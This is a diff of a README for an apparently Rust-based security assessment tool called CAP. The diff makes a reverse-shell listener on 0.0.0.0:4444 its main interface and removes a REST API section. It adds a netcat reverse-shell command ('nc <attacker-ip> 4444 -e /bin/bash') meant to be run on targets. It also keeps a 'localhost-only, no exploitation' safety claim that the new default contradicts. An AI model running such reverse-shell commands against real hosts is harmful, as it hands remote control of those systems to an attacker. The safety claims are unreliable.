@@ -29,21 +29,21 @@
 curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
 
 # Build CAP
-cd custom-c2
+cd cap
 cargo build --release
 
-# Initialize project
-./target/release/cap init my-assessment
-cd my-assessment
+# Start interactive shell listener (Penelope-style)
+./target/release/cap listen
+# Listens on 0.0.0.0:4444 by default
+# Press F12 to open control menu
 
-# Add authorized targets
-../target/release/cap scope add example.com
+# Connect from target
+nc <your-ip> 4444 -e /bin/bash
 
-# View available modules
-../target/release/cap modules
-
-# Run web enumeration
-../target/release/cap module --name web-enum --target https://example.com
+# Run reconnaissance modules
+./target/release/cap modules              # List available modules
+./target/release/cap scope add example.com  # Add target to scope
+./target/release/cap module --name web-enum --target https://example.com
 ```
 
 ---
@@ -59,7 +59,7 @@ CAP (Comprehensive Assessment Platform) is a research-oriented security orchestr
 - **⏰ Time-Bounded Sessions** - Auto-expiring sessions (24h default) enforce re-authorization
 - **🎯 Safe Defaults** - Localhost-only binding, read-only operations, no exploitation
 - **⚡ Modern Architecture** - Built with Rust for memory safety and performance
-- **🌐 Dual Interface** - Both CLI and REST API for flexibility
+- **🐚 Interactive Shell Handler** - Penelope-style TUI with F12 control menu
 
 ---
 
@@ -69,11 +69,11 @@ CAP (Comprehensive Assessment Platform) is a research-oriented security orchestr
 
 | Feature | Description |
 |---------|-------------|
+| **Shell Listener** | Interactive Penelope-style shell handler with F12 menu |
 | **Scope Management** | Whitelist-based targeting (IP/CIDR, domains, wildcards) |
 | **Session Management** | Time-bounded access with automatic expiration |
 | **Audit Logging** | Tamper-evident logs with cryptographic integrity |
 | **Configuration** | TOML-based with environment-specific configs |
-| **API Server** | RESTful API for automation and integration |
 
 ### Security Modules
 
@@ -125,31 +125,28 @@ CAP (Comprehensive Assessment Platform) is a research-oriented security orchestr
 │                      CAP Framework                            │
 ├──────────────────────────────────────────────────────────────┤
 │                                                               │
-│  ┌──────────┐  ┌─────────┐  ┌─────────────┐  ┌──────────┐  │
-│  │   CLI    │  │   API   │  │  Session    │  │  Shell   │  │
-│  │Interface │  │ (Axum)  │  │   Mgmt      │  │ Handler  │  │
-│  └──────────┘  └─────────┘  └─────────────┘  └──────────┘  │
+│  ┌─────────────────────────────────────────────────────┐    │
+│  │    Interactive Shell Listener (Primary Interface)   │    │
+│  │    • Penelope-Style TUI                             │    │
+│  │    • F12 Control Menu                               │    │
+│  │    • Multi-Session Management                       │    │
+│  │    • Non-blocking I/O                               │    │
+│  │    • Background/Foreground Control                  │    │
+│  └─────────────────────────────────────────────────────┘    │
 │                                                               │
 │  ┌─────────────────────────────────────────────────────┐    │
 │  │          Core Framework                              │    │
 │  │  • Scope Enforcement (IP/Domain whitelist)          │    │
 │  │  • Audit Logger (Cryptographic hash chain)          │    │
 │  │  • Configuration Management                          │    │
+│  │  • Session Management                                │    │
 │  └─────────────────────────────────────────────────────┘    │
 │                                                               │
 │  ┌─────────────────────────────────────────────────────┐    │
-│  │          Security Modules (Pluggable)                │    │
+│  │          Security Modules (CLI)                      │    │
 │  │  • Web Enumeration                                  │    │
 │  │  • DNS/Subdomain Discovery                          │    │
 │  │  • Port Scanning                                    │    │
-│  └─────────────────────────────────────────────────────┘    │
-│                                                               │
-│  ┌─────────────────────────────────────────────────────┐    │
-│  │          Shell Listener (Penelope-Style)             │    │
-│  │  • Interactive Terminal (F12 Menu)                  │    │
-│  │  • Multi-Session Management                         │    │
-│  │  • Non-blocking I/O                                 │    │
-│  │  • Background/Foreground Control                    │    │
 │  └─────────────────────────────────────────────────────┘    │
 │                                                               │
 └──────────────────────────────────────────────────────────────┘
@@ -282,14 +279,17 @@ cap module --name port-scan --target 192.168.1.100 \
 
 ### Shell Listener (Penelope-Style)
 
-CAP includes an advanced shell listener with interactive session management, similar to Penelope:
+CAP's primary interface is an advanced shell listener with interactive session management, similar to Penelope:
 
 ```bash
-# Start interactive shell listener
-cap shell listen --host 0.0.0.0 --port 4444
+# Start interactive shell listener (default: 0.0.0.0:4444)
+cap listen
+
+# Custom port
+cap listen --port 5555
 
 # Connect from target
-# On target machine: nc <your-ip> 4444 -e /bin/bash
+nc <your-ip> 4444 -e /bin/bash
 ```
 
 #### Interactive Control Menu
@@ -312,26 +312,29 @@ When connected to a shell, press **F12** to open the control menu:
 - **Session state tracking** - Active/Background/Terminated states
 - **Auto-cleanup** - Periodic cleanup of dead connections
 
-#### Shell Commands
+#### Session Management
+
+All session management is done through the interactive F12 menu:
 
 ```bash
-# List shell sessions (when listener is running)
-cap shell list
+# Start the listener
+cap listen
 
-# Attach to most recent session
-cap shell attach
+# When shells connect:
+# 1. Press F12 to open control menu
+# 2. View all active sessions with state indicators
+# 3. Navigate with arrow keys
+# 4. Press Enter to switch to a session
+# 5. Background current session
+# 6. Cleanup terminated sessions
+# 7. Press ESC or F12 to close menu
 
-# Attach to specific session
-cap shell attach --id <session-id>
-
-# Background a session
-cap shell background <session-id>
-
-# Foreground a session
-cap shell foreground <session-id>
-
-# Terminate a session
-cap shell kill <session-id>
+# Keyboard shortcuts:
+# F12 - Open/close control menu
+# ↑↓  - Navigate menu
+# ⏎   - Select menu item
+# ESC - Close menu
+# ^C  - Exit CAP
 ```
 
 ### Wordlist Management
@@ -381,35 +384,26 @@ cap audit --session-id <session-id>
 cap audit --export assessment-report.json
 ```
 
-### API Server
+### Interactive Shell Listener
 
-Start REST API for automation:
-
-```bash
-# Start listener
-cap listen --host 127.0.0.1 --port 8443
-
-# API endpoints available at:
-# - GET  /health
-# - GET  /api/sessions
-# - POST /api/sessions
-# - POST /api/modules/execute
-# - GET  /api/scope
-# - POST /api/scope
-# - GET  /api/audit
-```
-
-API Example:
+Start the Penelope-style shell listener:
 
 ```bash
-# Execute module via API
-curl -X POST http://localhost:8443/api/modules/execute \
-  -H "Content-Type: application/json" \
-  -d '{
-    "module": "web-enum",
-    "target": "https://example.com",
-    "threads": 10
-  }'
+# Start listener on default port (4444)
+cap listen
+
+# Custom host/port
+cap listen --host 0.0.0.0 --port 5555
+
+# Connect from target
+nc <attacker-ip> 4444 -e /bin/bash
+
+# Inside CAP:
+# - Press F12 to open control menu
+# - Navigate with arrow keys
+# - Switch between sessions
+# - Background/foreground shells
+# - Auto-cleanup of dead connections
 ```
 
 ---
